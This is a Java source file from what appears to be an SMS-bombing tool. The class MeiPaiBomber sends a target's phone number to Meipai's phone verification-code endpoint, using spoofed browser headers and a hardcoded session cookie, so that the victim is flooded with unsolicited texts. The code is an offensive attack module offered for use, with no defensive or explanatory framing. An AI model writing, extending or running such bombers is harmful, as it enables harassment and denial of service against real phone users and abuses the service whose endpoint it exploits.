package com.utils.attack;

import com.utils.HttpUtil;
import org.apache.http.impl.client.CloseableHttpClient;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by fz on 2015/8/23.
 */
public class MeiPaiBomber implements MessageBomber{

    public String name;

    public MeiPaiBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception {

        String url = "http://www.meipai.com/users/send_verify_code_to_phone";
        Map headers = new HashMap();
        headers.put("Accept", "text/plain, */*; q=0.01");
        headers.put("Accept-Encoding", "gzip, deflate");
        headers.put("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2");
        headers.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        headers.put("DNT", "1");
        headers.put("Host", "www.meipai.com");
        headers.put("Origin", "http://www.meipai.com");
        headers.put("Referer", "http://www.meipai.com/");
        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36");
        headers.put("X-Requested-With", "XMLHttpRequest");
        headers.put("Cookie", "MUSID=ocv09e4k421c3aoqr9ud4uh902; spread_f=a%3A2%3A%7Bs%3A4%3A%22from%22%3Bs%3A10%3A%22ref%3Ahao123%22%3Bs%3A9%3A%22timestamp%22%3Bi%3A1440339704%3B%7D; CNZZDATA1254838410=454878110-1440336030-http%253A%252F%252Fwww.hao123.com%252F%7C1440336030; sid=ocv09e4k421c3aoqr9ud4uh902; Hm_lvt_027deb58f2792dc5d4f5eae213f83aac=1440339725; Hm_lpvt_027deb58f2792dc5d4f5eae213f83aac=1440339725; ZDEDebuggerPresent=php,phtml,php3");
        Map params = new HashMap();
        params.put("phone", fuckNo);
        params.put("phone_flag", "86");
        params.put("type", "register");
        String result = HttpUtil.httpPost(url, headers, params);
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
